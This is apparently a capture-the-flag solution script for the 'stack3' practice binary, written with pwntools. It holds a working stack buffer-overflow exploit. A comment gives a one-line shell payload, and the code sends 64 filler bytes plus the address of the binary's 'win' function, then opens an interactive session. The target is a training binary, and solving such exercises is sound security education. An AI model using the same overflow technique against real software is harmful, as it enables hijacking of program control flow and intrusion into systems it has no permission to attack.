# python -c "print 'A'*0x40 + '\x82\x91\x04\x08'" | ./stack3

from pwn import *

p = process('./stack3')
elf = ELF('./stack3')
payload = 'A'*0x40 + p32(elf.sym['win'])
p.sendline(payload)
p.interactive()
p.close()
